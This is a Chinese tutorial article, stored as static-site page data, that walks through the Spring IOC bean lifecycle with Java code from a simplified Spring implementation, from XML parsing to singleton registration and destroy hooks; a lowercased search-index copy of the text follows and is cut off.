IOC",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/200.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20IOC.html",relativePath:"01.框架/01.Spring/01.spring/200.核心内容拆解 IOC.md",key:"v-ff2741c6",path:"/spring/spring/200/",headers:[{level:2,title:"读取XML文件",slug:"读取xml文件",normalizedTitle:"读取 xml 文件",charIndex:266},{level:2,title:"封装 BeanDefinition",slug:"封装-beandefinition",normalizedTitle:"封装 beandefinition",charIndex:1752},{level:2,title:"BeanFactoryPostProcessor",slug:"beanfactorypostprocessor",normalizedTitle:"beanfactorypostprocessor",charIndex:6633},{level:2,title:"注册实现BeanPostProcessor的类",slug:"注册实现beanpostprocessor的类",normalizedTitle:"注册实现 beanpostprocessor 的类",charIndex:8907},{level:2,title:"实例化Bean",slug:"实例化bean",normalizedTitle:"实例化 bean",charIndex:9031},{level:2,title:"注解属性填充",slug:"注解属性填充",normalizedTitle:"注解属性填充",charIndex:233},{level:2,title:"XML属性填充",slug:"xml属性填充",normalizedTitle:"xml 属性填充",charIndex:244},{level:2,title:"感知对象",slug:"感知对象",normalizedTitle:"感知对象",charIndex:18936},{level:2,title:"初始化方法之前",slug:"初始化方法之前",normalizedTitle:"初始化方法之前",charIndex:20221},{level:2,title:"Bean的初始化方法",slug:"bean的初始化方法",normalizedTitle:"bean 的初始化方法",charIndex:11230},{level:2,title:"初始化方法之后",slug:"初始化方法之后",normalizedTitle:"初始化方法之后",charIndex:22301},{level:2,title:"注册销毁事件",slug:"注册销毁事件",normalizedTitle:"注册销毁事件",charIndex:22789},{level:2,title:"scop处理单例",slug:"scop处理单例",normalizedTitle:"scop 处理单例",charIndex:25471}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"读取XML文件 封装 BeanDefinition BeanFactoryPostProcessor 注册实现BeanPostProcessor的类 实例化Bean 注解属性填充 XML属性填充 感知对象 初始化方法之前 Bean的初始化方法 初始化方法之后 注册销毁事件 scop处理单例",content:'Spring 是 JAVA 开发用到最多的一个 WEB 框架，核心是 IOC（控制反转）和 AOP（面向切面），但做为架构，想要对 Spring 要进行扩展等，必须要了解 Spring 的生命周期、事件、AOP、行为感知等。Spring 生命周期如下图：\n\n\n\n提示\n\n本文主要了解 spring 生命周期的有哪些，以及他们的核心代码是怎么编写，整个过程是偏 IOC 和 DI 的，IOC 将对象的创建和依赖关系的维护从代码中脱离出来，通过配置读取创建对象；DI 从注解属性填充过程以及 XML 属性填充过程为具体的体现。\n\n\n# 读取 XML 文件\n\n通过 ClassPathXmlApplicationContext 来读取资源文件下的 spring.xml\n\n    @Test\n    public void test() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n        UserService userService = applicationContext.getBean("userService", UserService.class);\n        System.out.println("测试结果：" + userService.queryUserInfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n根据文件类型使用不同的方式读取到流中\n\n    @Override\n    public Resource getResource(String location) {\n        Assert.notNull(location, "Location must not be null");\n        if (location.startsWith(CLASSPATH_URL_PREFIX)) {\n            return new ClassPathResource(location.substring(CLASSPATH_URL_PREFIX.length()));\n        }\n        else {\n            try {\n                URL url = new URL(location);\n                return new UrlResource(url);\n            } catch (MalformedURLException e) {\n                return new FileSystemResource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n调用 XML 解析\n\n    @Override\n    public void loadBeanDefinitions(Resource resource) throws BeansException {\n        try {\n            try (InputStream inputStream = resource.getInputStream()) {\n                doLoadBeanDefinitions(inputStream);\n            }\n        } catch (IOException | ClassNotFoundException | DocumentException e) {\n            throw new BeansException("IOException parsing XML document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 封装 BeanDefinition\n\n解析 XML 的整个过程：\n\n * 解析 DOM\n * 解析带有 @Component 注解的类，并封装为 BeanDefinition 注册到 BeanFactory\n * 解析不是 component-scan 定义的类\n\n    protected void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException, DocumentException {\n        // 使用 org.dom4j.io 的解析器\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStream);\n        Element root = document.getRootElement();\n        // 解析 context:component-scan 标签，扫描包中的类并提取相关信息，用于组装 BeanDefinition\n        Element componentScan = root.element("component-scan");\n        if (null != componentScan) {\n            String scanPath = componentScan.attributeValue("base-package");\n            if (StrUtil.isEmpty(scanPath)) {\n                throw new BeansException("The value of base-package attribute can not be empty or null");\n            }\n            // 扫描整个包\n            scanPackage(scanPath);\n        }\n        List<Element> beanList = root.elements("bean");\n        for (Element bean : beanList) {\n            String id = bean.attributeValue("id");\n            String name = bean.attributeValue("name");\n            String className = bean.attributeValue("class");\n            String initMethod = bean.attributeValue("init-method");\n            String destroyMethodName = bean.attributeValue("destroy-method");\n            String beanScope = bean.attributeValue("scope");\n            // 获取 Class，方便获取类中的名称\n            Class<?> clazz = Class.forName(className);\n            // 优先级 id > name\n            String beanName = StrUtil.isNotEmpty(id) ? id : name;\n            if (StrUtil.isEmpty(beanName)) {\n                beanName = StrUtil.lowerFirst(clazz.getSimpleName());\n            }\n            // 定义Bean\n            BeanDefinition beanDefinition = new BeanDefinition(clazz);\n            beanDefinition.setInitMethodName(initMethod);\n            beanDefinition.setDestroyMethodName(destroyMethodName);\n            if (StrUtil.isNotEmpty(beanScope)) {\n                beanDefinition.setScope(beanScope);\n            }\n            List<Element> propertyList = bean.elements("property");\n            // 读取属性并填充\n            for (Element property : propertyList) {\n                // 解析标签：property\n                String attrName = property.attributeValue("name");\n                String attrValue = property.attributeValue("value");\n                String attrRef = property.attributeValue("ref");\n                // 获取属性值：引入对象、值对象\n                Object value = StrUtil.isNotEmpty(attrRef) ? new BeanReference(attrRef) : attrValue;\n                // 创建属性信息\n                PropertyValue propertyValue = new PropertyValue(attrName, value);\n                beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n            }\n            if (getRegistry().containsBeanDefinition(beanName)) {\n                throw new BeansException("Duplicate beanName[" + beanName + "] is not allowed");\n            }\n            // 注册 BeanDefinition\n            getRegistry().registerBeanDefinition(beanName, beanDefinition);\n        }\n    }\n\n    private void scanPackage(String scanPath) {\n        String[] basePackages = StrUtil.splitToArray(scanPath, \',\');\n        ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(getRegistry());\n        scanner.doScan(basePackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n根据提供路径封装为 BeanDefinition 并注册到 BeanFactory\n\n    public void doScan(String... basePackages) {\n        for (String basePackage : basePackages) {\n            Set<BeanDefinition> candidates = findCandidateComponents(basePackage);\n            for (BeanDefinition beanDefinition : candidates) {\n                // 解析 Bean 的作用域 singleton、prototype\n                String beanScope = resolveBeanScope(beanDefinition);\n                if (StrUtil.isNotEmpty(beanScope)) {\n                    beanDefinition.setScope(beanScope);\n                }\n                registry.registerBeanDefinition(determineBeanName(beanDefinition), beanDefinition);\n            }\n        }\n\n        // 注册处理注解的 BeanPostProcessor(@Autowired、@Value)\n        registry.registerBeanDefinition("cn.bugstack.springframework.context.annotation.internalAutowiredAnnotationProcessor", new BeanDefinition(AutowiredAnnotationBeanPostProcessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n对提供的包路径扫描有 @Component 注解的类\n\n    public Set<BeanDefinition> findCandidateComponents(String basePackage) {\n        Set<BeanDefinition> candidates = new LinkedHashSet<>();\n        Set<Class<?>> classes = ClassUtil.scanPackageByAnnotation(basePackage, Component.class);\n        for (Class<?> clazz : classes) {\n            candidates.add(new BeanDefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# BeanFactoryPostProcessor\n\nBeanFactoryPostProcessor 可以修改我们对 BeanDefinition 定义的所有信息，可以添加属性，修改属性，添加额外的方法等。具体会对所有实现 BeanFactoryPostProcessor 的类进行获取，并循环调用 postProcessBeanFactory 方法\n\n    private void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanFactoryPostProcessor> beanFactoryPostProcessorMap = beanFactory.getBeansOfType(BeanFactoryPostProcessor.class);\n        for (BeanFactoryPostProcessor beanFactoryPostProcessor : beanFactoryPostProcessorMap.values()) {\n            beanFactoryPostProcessor.postProcessBeanFactory(beanFactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n提供一个默认的实现\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n        try {\n            // 加载属性文件\n            DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n            Resource resource = resourceLoader.getResource(location);\n\n            // 把属性文件的内容加载到Properties里组成键值对\n            Properties properties = new Properties();\n            properties.load(resource.getInputStream());\n            String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n            for (String beanName : beanDefinitionNames) {\n                BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n                PropertyValues propertyValues = beanDefinition.getPropertyValues();\n                for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                    Object value = propertyValue.getValue();\n                    if (!(value instanceof String)) continue;\n                    value = resolvePlaceholder((String) value, properties);\n                    propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), value));\n                }\n            }\n            // 向容器中添加字符串解析器，供解析@Value注解使用\n            StringValueResolver valueResolver = new PlaceholderResolvingStringValueResolver(properties);\n            // 注册到容器，以便后续使用\n            beanFactory.addEmbeddedValueResolver(valueResolver);\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 注册实现 BeanPostProcessor 的类\n\nBeanPostProcessor 就是提供了 postProcessBeforeInitialization，postProcessAfterInitialization 两种方法，提供我们在实例化 Bean 的时候，所有实现 BeanPostProcessor 的类，注册到 List<BeanPostProcessor> beanPostProcessors = new ArrayList<BeanPostProcessor>(); 中\n\n    private void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanPostProcessor> beanPostProcessorMap = beanFactory.getBeansOfType(BeanPostProcessor.class);\n        for (BeanPostProcessor beanPostProcessor : beanPostProcessorMap.values()) {\n            beanFactory.addBeanPostProcessor(beanPostProcessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 实例化 Bean\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean##getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean##getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n实例化 Bean 的具体方法\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // 实例化 Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // 处理循环依赖，将实例化后的Bean对象提前放入缓存中暴露出来\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（注解属性填充）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 给 Bean 填充属性（xml属性填充）\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Instantiation of bean failed", e);\n        }\n        // 注册实现了 DisposableBean 接口的 Bean 对象\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // 获取代理对象\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreateBeanInstance 使用了 CGLIB 来实例化一个 Bean, 也可以使用 JAVA 自带的反射\n\n    protected Object createBeanInstance(BeanDefinition beanDefinition, String beanName, Object[] args) {\n        Constructor constructorToUse = null;\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Constructor<?>[] declaredConstructors = beanClass.getDeclaredConstructors();\n        for (Constructor ctor : declaredConstructors) {\n            if (null != args && ctor.getParameterTypes().length == args.length) {\n                constructorToUse = ctor;\n                break;\n            }\n        }\n        return getInstantiationStrategy().instantiate(beanDefinition, beanName, constructorToUse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nCGLIB 实现实例化\n\n@Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(beanDefinition.getBeanClass());\n        enhancer.setCallback(new NoOp() {\n            @Override\n            public int hashCode() {\n                return super.hashCode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getParameterTypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nJAVA 反射实现序列化\n\n    @Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Class clazz = beanDefinition.getBeanClass();\n        try {\n            if (null != ctor) {\n                return clazz.getDeclaredConstructor(ctor.getParameterTypes()).newInstance(args);\n            } else {\n                return clazz.getDeclaredConstructor().newInstance();\n            }\n        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {\n            throw new BeansException("Failed to instantiate [" + clazz.getName() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 注解属性填充\n\n注解属性，会从之前注册的 BeanPostProcessor 里匹配 InstantiationAwareBeanPostProcessor 的对象，其中默认的 AutowiredAnnotationBeanPostProcessor 具体实现了该类\n\n    protected void applyBeanPostProcessorsBeforeApplyingPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                PropertyValues pvs = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).postProcessPropertyValues(beanDefinition.getPropertyValues(), bean, beanName);\n                if (null != pvs) {\n                    for (PropertyValue propertyValue : pvs.getPropertyValues()) {\n                        beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nAutowiredAnnotationBeanPostProcessor 感知注解属性填充\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) throws BeansException {\n        Class<?> clazz = bean.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n        // 获得对象所有字段\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field : declaredFields) {\n            // @Value 注解\n            Value valueAnnotation = field.getAnnotation(Value.class);\n            if (null != valueAnnotation) {\n                Object value = valueAnnotation.value();\n                // 解析得到值\n                value = beanFactory.resolveEmbeddedValue((String) value);\n                // 类型转换\n                Class<?> sourceType = value.getClass();\n                Class<?> targetType = (Class<?>) TypeUtil.getType(field);\n                // 对值进行转换处理\n                ConversionService conversionService = beanFactory.getConversionService();\n                if (conversionService != null) {\n                    if (conversionService.canConvert(sourceType, targetType)) {\n                        value = conversionService.convert(value, targetType);\n                    }\n                }\n                // 把值设置进去\n                BeanUtil.setFieldValue(bean, field.getName(), value);\n            }\n        }\n        // 2. 处理注解 @Autowired\n        for (Field field : declaredFields) {\n            Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n            if (null != autowiredAnnotation) {\n                Class<?> fieldType = field.getType();\n                String dependentBeanName = null;\n                Qualifier qualifierAnnotation = field.getAnnotation(Qualifier.class);\n                Object dependentBean = null;\n                if (null != qualifierAnnotation) {\n                    dependentBeanName = qualifierAnnotation.value();\n                    dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n                } else {\n                    dependentBean = beanFactory.getBean(fieldType);\n                }\n                BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# XML 属性填充\n\nXML 属性填充这里说过会出现循环依赖的问题，在实例化阶段的前后已经对这个处理了，后续会单独讲解\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A 依赖 B，获取 B 的实例化\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // 类型转换\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException("Error setting property values：" + beanName + " message：" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 感知对象\n\n感知对象做为一个扩展接口，只要我们的 Bean 实现了这些接口，就可以为我们的 Bean 提供额外的能力\n\n    private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // invokeAwareMethods（感知对象）\n        if (bean instanceof Aware) {\n            if (bean instanceof BeanFactoryAware) {\n                ((BeanFactoryAware) bean).setBeanFactory(this);\n            }\n            if (bean instanceof BeanClassLoaderAware) {\n                ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader());\n            }\n            if (bean instanceof BeanNameAware) {\n                ((BeanNameAware) bean).setBeanName(beanName);\n            }\n        }\n        // 1. 执行 BeanPostProcessor Before 处理\n        Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n        // 执行 Bean 对象的初始化方法\n        try {\n            invokeInitMethods(beanName, wrappedBean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Invocation of init method of bean[" + beanName + "] failed", e);\n        }\n        // 2. 执行 BeanPostProcessor After 处理\n        wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n        return wrappedBean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 初始化方法之前\n\n在 Bean 的初始化方法之前调用，默认提供了 applicationContext 的上下文注入，当某个类实现了 ApplicationContextAware，就提供 applicationContext 上下文的能力，只是我们要实现的是 ApplicationContextAware ，并不是 BeanPostProcessor\n\n    @Override\n    public Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessBeforeInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        if (bean instanceof ApplicationContextAware){\n            ((ApplicationContextAware) bean).setApplicationContext(applicationContext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Bean 的初始化方法\n\nBean 初始化方法还是比较简单的，主要是通过判断是否实现 InitializingBean 接口，如果实现了，则调用实例化对象实现的 afterPropertiesSet 方法。如果不是以接口实现的，是以 XML 描述的，则是通过反射的方式调用该方法。\n\n    private void invokeInitMethods(String beanName, Object bean, BeanDefinition beanDefinition) throws Exception {\n        // 1. 实现接口 InitializingBean\n        if (bean instanceof InitializingBean) {\n            ((InitializingBean) bean).afterPropertiesSet();\n        }\n\n        // 2. 注解配置 init-method {判断是为了避免二次执行销毁}\n        String initMethodName = beanDefinition.getInitMethodName();\n        if (StrUtil.isNotEmpty(initMethodName)) {\n            Method initMethod = beanDefinition.getBeanClass().getMethod(initMethodName);\n            if (null == initMethod) {\n                throw new BeansException("Could not find an init method named \'" + initMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            initMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userDao" class="cn.bugstack.springframework.test.bean.UserDao" init-method="initDataMethod" destroy-method="destroyDataMethod"/>\n\n\n1\n\n\n\n# 初始化方法之后\n\n    @Override\n    public Object applyBeanPostProcessorsAfterInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessAfterInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 注册销毁事件\n\n销毁事件需要 Bean 实现 DisposableBean 接口并重写 destroy () 方法。如下先是把实现 DisposableBean 或有在 XML 描述过销毁方法的注册到一个容器里。\n\n    protected void registerDisposableBeanIfNecessary(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // 非 Singleton 类型的 Bean 不执行销毁方法\n        if (!beanDefinition.isSingleton()) return;\n        if (bean instanceof DisposableBean || StrUtil.isNotEmpty(beanDefinition.getDestroyMethodName())) {\n            registerDisposableBean(beanName, new DisposableBeanAdapter(bean, beanName, beanDefinition));\n        }\n    }\n\n    public void registerDisposableBean(String beanName, DisposableBean bean) {\n        disposableBeans.put(beanName, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n然后再整个启动过程结束调用 registerShutdownHook 方法添加一个钩子监听。\n\n    @Override\n    public void registerShutdownHook() {\n        // Java 中的一个方法，它用于注册 JVM 关闭时要执行的特定代码块。当 JVM 即将关闭时，这些代码块会被执行，以便进行清理、释放资源等操作。\n        // 这些代码块通常称为“钩子（hook）”，因此该方法也被称为“添加关闭钩子（Add Shutdown Hook）”。\n        Runtime.getRuntime().addShutdownHook(new Thread(this::close));\n    }\n\n    @Override\n    public void close() {\n        // 发布容器关闭事件\n        publishEvent(new ContextClosedEvent(this));\n        // 执行销毁单例bean的销毁方法\n        getBeanFactory().destroySingletons();\n    }\n\n    public void destroySingletons() {\n        Set<String> keySet = this.disposableBeans.keySet();\n        Object[] disposableBeanNames = keySet.toArray();\n\n        for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n            Object beanName = disposableBeanNames[i];\n            DisposableBean disposableBean = disposableBeans.remove(beanName);\n            try {\n                disposableBean.destroy();\n            } catch (Exception e) {\n                throw new BeansException("Destroy method on bean with name \'" + beanName + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        // 1. 实现接口 DisposableBean\n        if (bean instanceof DisposableBean) {\n            ((DisposableBean) bean).destroy();\n        }\n        // 2. 注解配置 destroy-method {判断是为了避免二次执行销毁}\n        if (StrUtil.isNotEmpty(destroyMethodName) && !(bean instanceof DisposableBean && "destroy".equals(this.destroyMethodName))) {\n            Method destroyMethod = bean.getClass().getMethod(destroyMethodName);\n            if (null == destroyMethod) {\n                throw new BeansException("Couldn\'t find a destroy method named \'" + destroyMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            destroyMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop 处理单例\n\n    public void registerSingleton(String beanName, Object singletonObject) {\n        // 三级缓存\n        singletonObjects.put(beanName, singletonObject);\n        // 二级缓存\n        earlySingletonObjects.remove(beanName);\n        // 一级缓存\n        singletonFactories.remove(beanName);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'spring 是 java 开发用到最多的一个 web 框架，核心是 ioc（控制反转）和 aop（面向切面），但做为架构，想要对 spring 要进行扩展等，必须要了解 spring 的生命周期、事件、aop、行为感知等。spring 生命周期如下图：\n\n\n\n提示\n\n本文主要了解 spring 生命周期的有哪些，以及他们的核心代码是怎么编写，整个过程是偏 ioc 和 di 的，ioc 将对象的创建和依赖关系的维护从代码中脱离出来，通过配置读取创建对象；di 从注解属性填充过程以及 xml 属性填充过程为具体的体现。\n\n\n# 读取 xml 文件\n\n通过 classpathxmlapplicationcontext 来读取资源文件下的 spring.xml\n\n    @test\n    public void test() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n        userservice userservice = applicationcontext.getbean("userservice", userservice.class);\n        system.out.println("测试结果：" + userservice.queryuserinfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n根据文件类型使用不同的方式读取到流中\n\n    @override\n    public resource getresource(string location) {\n        assert.notnull(location, "location must not be null");\n        if (location.startswith(classpath_url_prefix)) {\n            return new classpathresource(location.substring(classpath_url_prefix.length()));\n        }\n        else {\n            try {\n                url url = new url(location);\n                return new urlresource(url);\n            } catch (malformedurlexception e) {\n                return new filesystemresource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n调用 xml 解析\n\n    @override\n    public void loadbeandefinitions(resource resource) throws beansexception {\n        try {\n            try (inputstream inputstream = resource.getinputstream()) {\n                doloadbeandefinitions(inputstream);\n            }\n        } catch (ioexception | classnotfoundexception | documentexception e) {\n            throw new beansexception("ioexception parsing xml document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 封装 beandefinition\n\n解析 xml 的整个过程：\n\n * 解析 dom\n * 解析带有 @component 注解的类，并封装为 beandefinition 注册到 beanfactory\n * 解析不是 component-scan 定义的类\n\n    protected void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception, documentexception {\n        // 使用 org.dom4j.io 的解析器\n        saxreader reader = new saxreader();\n        document document = reader.read(inputstream);\n        element root = document.getrootelement();\n        // 解析 context:component-scan 标签，扫描包中的类并提取相关信息，用于组装 beandefinition\n        element componentscan = root.element("component-scan");\n        if (null != componentscan) {\n            string scanpath = componentscan.attributevalue("base-package");\n            if (strutil.isempty(scanpath)) {\n                throw new beansexception("the value of base-package attribute can not be empty or null");\n            }\n            // 扫描整个包\n            scanpackage(scanpath);\n        }\n        list<element> beanlist = root.elements("bean");\n        for (element bean : beanlist) {\n            string id = bean.attributevalue("id");\n            string name = bean.attributevalue("name");\n            string classname = bean.attributevalue("class");\n            string initmethod = bean.attributevalue("init-method");\n            string destroymethodname = bean.attributevalue("destroy-method");\n            string beanscope = bean.attributevalue("scope");\n            // 获取 class，方便获取类中的名称\n            class<?> clazz = class.forname(classname);\n            // 优先级 id > name\n            string beanname = strutil.isnotempty(id) ? id : name;\n            if (strutil.isempty(beanname)) {\n                beanname = strutil.lowerfirst(clazz.getsimplename());\n            }\n            // 定义bean\n            beandefinition beandefinition = new beandefinition(clazz);\n            beandefinition.setinitmethodname(initmethod);\n            